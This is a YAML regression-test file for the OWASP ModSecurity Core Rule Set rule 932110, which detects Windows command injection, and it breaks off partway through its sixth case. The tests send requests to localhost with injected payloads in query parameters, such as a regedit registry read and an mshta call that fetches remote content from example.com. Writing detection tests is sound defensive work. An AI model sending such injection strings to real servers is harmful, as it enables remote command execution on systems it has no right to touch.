---
meta:
  author: airween, Franziska BÃ¼hler
  description: "Remote Command Execution: Windows Command Injection test cases"
  enabled: true
  name: 932110.yaml
tests:
  - test_title: 932110-1
    desc: "Windows Command Injection true positive test"
    stages:
      - stage:
          input:
            dest_addr: 127.0.0.1
            headers:
              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
              Host: "localhost"
              User-Agent: "OWASP ModSecurity Core Rule Set"
            method: GET
            port: 80
            # "cmd=; regedit HKLM\Software\Microsoft\WindowsNT\CurrentVersion\ProfileList;"
            uri: /?cmd=%3B%regedit%20HKLM%5CSoftware%5CMicrosoft%5CWindowsNT%5CCurrentVersion%5CProfileList
            version: HTTP/1.0
          output:
            log_contains: id "932110"
  - test_title: 932110-2
    desc: "Windows Command Injection true negative test"
    stages:
      - stage:
          input:
            dest_addr: 127.0.0.1
            headers:
              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
              Host: "localhost"
              User-Agent: "OWASP ModSecurity Core Rule Set"
            method: GET
            port: 80
            # "cmd=format "
            uri: /?cmd=format%20
            version: HTTP/1.0
          output:
            no_log_contains: id "932110"
  - test_title: 932110-3
    desc: "Windows Command Injection - bypass test"
    stages:
      - stage:
          input:
            dest_addr: 127.0.0.1
            headers:
              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
              Host: "localhost"
              User-Agent: "OWASP ModSecurity Core Rule Set"
            method: GET
            port: 80
            # "cmd=; mshta http://example.com"
            uri: /?cmd=;%20mshta%20http://example.com
            version: HTTP/1.0
          output:
            log_contains: id "932110"
  - test_title: 932110-4
    desc: Windows Command Injection bypass with time
    stages:
      - stage:
          input:
            dest_addr: 127.0.0.1
            headers:
              Host: localhost
              User-Agent: OWASP ModSecurity Core Rule Set
              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
              Accept-Encoding: gzip, deflate, br
              Accept-Language: en-us,en;q=0.5
            method: GET
            port: 80
            uri: "/?foo=time+cmd"
            version: HTTP/1.1
          output:
            log_contains: "id \"932110\""
  - test_title: 932110-5
    desc: Windows Command Injection bypass with time negative test
    stages:
      - stage:
          input:
            dest_addr: 127.0.0.1
            headers:
              Host: localhost
              User-Agent: OWASP ModSecurity Core Rule Set
              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
              Accept-Encoding: gzip, deflate, br
              Accept-Language: en-us,en;q=0.5
            method: GET
            port: 80
            uri: "/?foo=time+warner+"
            version: HTTP/1.1
          output:
            no_log_contains: "id \"932110\""
  - test_title: 932110-6
    desc: Windows Command Injection test for BB finding 935E1D91
    stages:
      - stage:
          input:
            dest_addr: 127.0.0.1
            headers:
              Host: localhost
              User-Agent: OWASP ModSecurity Core Rule Set
